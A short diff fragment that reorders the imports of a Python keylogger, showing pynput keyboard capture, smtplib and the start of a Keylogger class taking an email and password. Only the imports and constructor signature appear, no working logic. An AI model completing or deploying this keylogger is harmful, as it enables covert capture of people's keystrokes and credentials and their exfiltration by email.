@@ -1,7 +1,6 @@
+import smtplib
 import pynput.keyboard
 import threading
-import smtplib
-
 
 class Keylogger:
     def __init__(self, time, email, password):
